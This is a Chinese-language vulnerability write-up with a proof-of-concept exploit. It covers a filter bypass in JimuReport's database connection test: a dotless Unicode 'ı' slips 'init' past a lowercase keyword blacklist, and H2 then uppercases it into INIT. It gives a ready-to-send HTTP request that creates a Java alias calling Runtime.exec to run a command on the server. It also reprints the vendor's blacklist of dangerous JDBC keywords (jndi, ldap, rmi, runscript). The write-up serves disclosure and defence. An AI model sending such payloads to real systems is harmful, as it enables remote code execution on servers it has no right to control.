# H2 filter bypass RCE

## 漏洞原理

漏洞启发源于dataease的一个漏洞通报

https://github.com/dataease/dataease/security/advisories/GHSA-xjhm-r8p8-c2cg

两位师傅发现了h2在解析jdbcurl时，unicode大小写转换的问题

- H2 通过将整个 URL 转换为大写字母，以不区分大小写的方式解析 JDBC URL。
- Java 将 Unicode 字符 ı 转换为 I（大写），s 转换为 S（大写），但将这些字符转换为小写（如 DataEase 验证中所做的操作）保持不变（例如 ınit →小写仍为 ınit，而 H2 则解析为 INIT）。

而jimureport中也存在相同的问题

## POC

```http
POST /jmreport/testConnection HTTP/1.1
Host: 192.168.239.1:8085
Content-Length: 275
tenantId: null
X-TIMESTAMP: 1781772534945
X-Access-Token: 70fbec2a-2bc9-4b2a-9000-1b5ff468b707
X-Sign: 394750395DA55845E39532363D60AF57
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
X-Tenant-Id: null
token: 70fbec2a-2bc9-4b2a-9000-1b5ff468b707
JmReport-Tenant-Id: null
Origin: http://192.168.239.1:8085
Referer: http://192.168.239.1:8085/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"dbType":"H2","dbDriver":"org.h2.Driver","dbUrl":"jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;ınit=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('cmd /c calc')\\;","dbUsername":"","dbPassword":""}
```

## 代码分析

`org.jeecg.modules.jmreport.dyndb.util.b#o`过滤代码如下，针对h2的关键字为`init=`和`runscript`，该代码的逻辑为先将jdbcurl全部转换为小写，再匹配黑名单，但未注意到特殊的unicode字符，攻击者将`init`替换为`ınit`，根据java大小写转换的规则，在将`ınit`转换为小写时，字符不变，因此黑名单并未匹配到该字符。但H2会将整个URL转换为大写，此时`ınit`还原成了`INIT`，造成RCE

```java
private static void o(String url) {
        if (url != null && !url.isEmpty()) {
            String lowerUrl = url.toLowerCase();
            String[] dangerousKeywords = new String[]{"init=", "runscript", "socketfactory", "socketfactoryarg", "sslfactory", "sslfactoryarg", "loggerlevel", "loggerfile", "allowloadlocalinfile=true", "allowurlinlocalinfile=true", "propertiestransform", "connectionlifecycleinterceptors", "clientrerouteserverlistjndiname", "jndi:", "ldap:", "rmi:", "groovy:", "javascript:", "script:", "classloader", "loadclass"};
            String[] var3 = dangerousKeywords;
            int var4 = dangerousKeywords.length;

            for(int var5 = 0; var5 < var4; ++var5) {
                String keyword = var3[var5];
                if (lowerUrl.contains(keyword)) {
                    throw new IllegalArgumentException(String.format("安全风险：JDBC URL 包含危险参数或协议 [%s]", keyword));
                }
            }

        }
    }
```

